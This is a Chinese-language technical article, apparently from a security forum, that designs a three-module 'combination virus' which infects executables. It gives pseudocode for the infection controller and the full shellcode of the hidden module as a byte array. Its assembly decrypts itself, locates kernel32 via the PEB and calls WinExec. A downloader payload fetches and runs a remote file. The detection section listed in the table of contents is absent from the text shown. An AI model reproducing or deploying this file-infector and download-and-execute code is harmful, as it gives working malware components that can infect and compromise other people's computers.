
# 基于 shellcode 感染方式的组合病毒研究

> 原文：[`www.pediy.com/kssd/pediy11/110429.html`](https://www.pediy.com/kssd/pediy11/110429.html)

**目录**

- `0x01`. 简介
- `0x02`. 组合病毒
  - 2.1. 原理
  - 2.2. 一种实现思路
- `0x03`. 技术实现
  - 3.1. 控制模块 `C` 的伪码描述
  - 3.2. 隐藏模块 `S` 的 shellcode
  - 3.3. 关于执行模块 `T`
  - 3.4. 整体框架
- `0x04`. 检测讨论

## 0x01. 简介

组合病毒的概念，最早是在计算机病毒理论研究中确定的一种病毒类型。是属于理论上预测存在，实际环境中还未得到证实的一种病毒类型。在最近的分析样本中发现了类似思路的病毒，在该思路的基础上我们探讨一种可能的组合病毒技术实现及检测方案。

## 0x02. 组合病毒

### 2.1. 原理

组合病毒与一般计算机病毒的差异是组合病毒由两部分 `a`(激活函数)和 `h`(隐藏函数)组成，每个成分单独都不构成病毒，只有它们组合在一起才构成一个计算机病毒。在激活函数 `a` 未作用到被 `h` 感染的程序前，被 `h` 感染的程序表现如原来一样，激活函数 `a` 作用后，被感染程序才开始表现感染和传播性。

组合病毒的特点是难于清除和具有极强的隐蔽性。关于这方面原理性描述可查找基于递归函数的计算机病毒描述一文。

### 2.2. 一种实现思路

根据前面的原理可知，组合病毒至少需要由两个部分(`a`，`h`)功能代码组成，在这里我们设想构造一个由 3 部分独立功能代码组成的程序。对任意一个符合组合病毒思路的 `exe` 程序，都可由三部分组成，分别是控制模块 `C`、执行模块 `T`、隐藏模块 `S` 组成，我们可以设想模块 `C` 完成激活功能及整体调度功能，模块 `T` 完成病毒的 `payload` 部分，这里我们把它简化一段类似 `downloader` 下载器的功能，模块 `S` 是隐藏的，基于 `shellcode` 方式感染其它 `exe` 文件，在模块 `C` 未进行调度激活前，被 `S` 感染的宿主程序不具有破坏行为，激活后模块 `S` 将调用执行模块 `T`。工作流程如下：

**病毒文件 `CV`(组合病毒)**

```text
          病毒文件 CV(组合病毒)
                 |
                 |
                \|/
       +-----------------+
       |   控制模块 C     |------------->| 可随机选取一个感染对象  |
       +-----------------+              .------------------------.
       |   执行模块 T     |------------->| 可随机分散在任意文件夹中|
       +-----------------+              .------------------------.
       |   隐藏模块 S     |------------->| 可随机感染一组文件对象  |
       +-----------------+              .------------------------.
```

**执行步骤：**

1. 模块 `C` 随机选取一个路径，注入模块 `S`，去感染该路径下的所有文件，当获得控制权时，执行模块 `C` 传入的参数。
2. 模块 `C` 释放若干个模块 `T` 到随机的不同路径下。
3. 模块 `C` 随机选取一个路径下的文件，拷贝整体 `CV` 去感染它。
4. 当被模块 `S` 感染后的宿主程序运行时，且路径 `P` 下存在模块 `T`，那么病毒将被执行。

这样当以计算机病毒的定义方式去检测时，模块 `C`,`T`,`S` 将不可被检测(仅是理论衡量而不是实际检测)。因模块 `C` 仅是控制调度程序，具备感染性但却不具备破坏能力。模块 `T` 虽有破坏功能但不具备感染能力且不能主动运行，模块 `S` 虽然感染了宿主文件获得了执行权限但他本身并没有感染与破坏能力。

所以仅当模块 `C`，释放模块 `T` 到相应路径下，模块 `S` 感染了宿主程序时，病毒才会执行破坏功能。

## 0x03. 技术实现

### 3.1. 控制模块 C 的伪码描述

```text
begin
   获得随机路径列表 t；
   获得本次产生随机路径个数 n1；
   for each t[i] do
      用模块 S 去感染 t[i]下的 exe 文件 ；当没有匹配时，S 一直处于隐藏当中
   获得本次产生随机路径个数 n2；
   for each t[j] do
      释放模块 T 到 t[j]处          ；相当于激活
   do
      随机产生一个被感染文件 k；
   while(k 包含在 t[i]中，且未被 s 感染)
   拷贝自身 CV 去感染 k；
end
```

### 3.2. 隐藏模块 S 的 shellcode

`S` 的部分功能非常简单，它只为了获得权限去执行一个 `exe` 程序。当然为了避免启发式检测，也可以做的比较复杂，这里仅做一个简单的演示，先重定位，解密，获得 `kernel32` 基址，获得 `WinExec` `API`，执行即可。需要注意的是 `S` 模块本身并不知道要执行的 `exe` 路径，这里是模块 `C`，激活后操作的，为了简单起见，在将模块 `S` 注入到宿主程序的一段空穴中后，可将路径直接写在 `S` 模块后面一同加密处理。

```text
                 加密                 注入
   模块 S   --->+-------------+ ---> +----------+ ---> +---------+   宿主程序
                | shellcode   |      | loader   |      | eop    -|-
                +-------------+      |----------|      |---------| |
   模块 C 写入-->| 模块 T 的路径 |    |crypt data|      |宿主空穴 | |
                +-------------+      +----------+      | s 模块 <-|-
                                                       |         |
                                                       +---------+
```

下面是模块 `S` 的 `shellcode`，

```c
unsigned char data[176] = {
  0xE8, 0x00, 0x00, 0x00, 0x00, 0x58, 0x83, 0xC0, 0x15, 0xB1, 0x10, 0x66, 0x8B, 0x18, 0x66, 0x81,
  0xFB, 0xF6, 0xF7, 0x74, 0x05, 0x30, 0x08, 0x40, 0xEB, 0xF1, 0xE8, 0x08, 0x00, 0x00, 0x00, 0x57,
  0x69, 0x6E, 0x45, 0x78, 0x65, 0x63, 0x00, 0x5E, 0xB9, 0x07, 0x00, 0x00, 0x00, 0xE8, 0x07, 0x00,
  0x00, 0x00, 0xE8, 0x24, 0x00, 0x00, 0x00, 0xEB, 0x72, 0x56, 0x33, 0xC0, 0x64, 0x8B, 0x40, 0x30,
  0x85, 0xC0, 0x78, 0x0C, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x1C, 0xAD, 0x8B, 0x40, 0x08, 0xEB, 0x09,
  0x8B, 0x40, 0x34, 0x8D, 0x40, 0x7C, 0x8B, 0x40, 0x3C, 0x5E, 0xC3, 0x8B, 0xD8, 0x03, 0x58, 0x3C,
  0x83, 0xC3, 0x78, 0x8B, 0x1B, 0x03, 0xD8, 0x8B, 0x53, 0x20, 0x03, 0xD0, 0x53, 0x33, 0xDB, 0x56,
  0x51, 0x8B, 0x3A, 0x03, 0xF8, 0xF3, 0xA6, 0x74, 0x08, 0x59, 0x5E, 0x83, 0xC2, 0x04, 0x43, 0xEB,
  0xEE, 0x59, 0x59, 0x59, 0xD1, 0xE3, 0x8B, 0x51, 0x24, 0x03, 0xD0, 0x03, 0xD3, 0x8B, 0x12, 0x81,
  0xE2, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x59, 0x1C, 0x03, 0xD8, 0xC1, 0xE2, 0x02, 0x03, 0xDA, 0x8B,
  0x13, 0x03, 0xD0, 0xC3, 0x58, 0x6A, 0x00, 0x50, 0xFF, 0xD2, 0xC3, 0xE8, 0xF4, 0xFF, 0xFF, 0xFF
};
```

汇编代码如下：

```asm
.code
assume fs:nothing
START:
  call reloc
reloc:
  pop eax
  add eax,15h ；定位到 begin
  mov cl,10h  ；此处数字随意填写，最终在注入时，由模块 C 随机产生一个数值，并写如该位置
encrypt:
  mov bx,[eax]
  cmp bx,0f7f6h ；f7f6h 是设定的边界值
  je  begin
  xor [eax],cl  ；cl 是密钥，由外部程序改写
  inc eax
  jmp encrypt
begin:
  call _run
  db 'W'
  db 'i'
  db 'n'
  db 'E'
  db 'x'
  db 'e'
  db 'c'
  db 0
_run:
    pop esi ； 要搜索的 api 名称
    mov ecx,7
    call find_k32_address
    call get_api
    jmp exec
find_k32_address:
  push esi          ；push0
  xor  eax,eax
  mov  eax,fs:[eax+30h]
  test eax,eax
  js   f_k32_win9x
  mov  eax,[eax+0ch]
  mov  esi,[eax+1ch]
  lodsd
  mov  eax,[eax+8h]
  jmp f_k32_finished
f_k32_win9x:
  mov  eax,[eax+34h]
       lea  eax,[eax+7ch]
       mov  eax,[eax+3ch]
f_k32_finished:
      pop esi          ；pop0
      ret
get_api:
      mov ebx,eax
      add ebx,[eax+3ch]
      add ebx,78h
      mov ebx,[ebx]
      add ebx,eax  ；查找导入表
      mov edx,[ebx+20h]
      add edx,eax
      push ebx    ； push1 - 导入表结构指针
      xor ebx,ebx
cmp_api_name:
  push esi    ； push2
  push ecx    ； push3
  mov  edi,[edx]
  add  edi,eax
  repe cmpsb
  je   get_api_address
  pop ecx
  pop esi
  add edx,4
  inc ebx
  jmp cmp_api_name
get_api_address:
  pop ecx
  pop ecx
  pop ecx
  shl ebx,1
  mov edx,[ecx+24h]
  add edx,eax
  add edx,ebx
  mov edx,[edx]
  and edx,0ffffh
  mov ebx,[ecx+1ch]
  add ebx,eax
  shl edx,2
  add ebx,edx
  mov edx,[ebx]
  add edx,eax
  ret
exec_t:
  pop eax  ； eax 内容即指向了 shellcode 尾部，由模块 C 写入的激活执行 T 的路径。
  push 0
  push eax
  call edx
  ret
exec:
  call exec_t
end START
```

以上代码参考了 `Cr4sh` 的代码略加修改，感谢 `Cr4sh`。

### 3.3. 关于执行模块 T

这里模块 `T` 部分仅做演示，仅为一个 `downloader` 功能。生产的 `exe` 文件未做减肥优化。

```asm
.586
.model flat, stdcall
include urlmon.inc
include kernel32.inc
include user32.inc
includelib urlmon.lib
includelib kernel32.lib
includelib user32.lib

.data
sz_net_path db "http://127.0.0.1/x.bin",0
sz_loc_path db "c:\windows\calc.exe",0
sz_title    db "model T",0

.code
START:
    invoke URLDownloadToFile,0,offset sz_net_path,offset sz_loc_path,0,0
    invoke WinExec,offset sz_loc_path,0
    invoke MessageBox,0,offset sz_loc_path,offset sz_title ,0
    invoke ExitProcess,0
end START
```

```c
unsigned char data[2560] = {
  0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
  0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00,
  0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
  0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
  0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
};
```
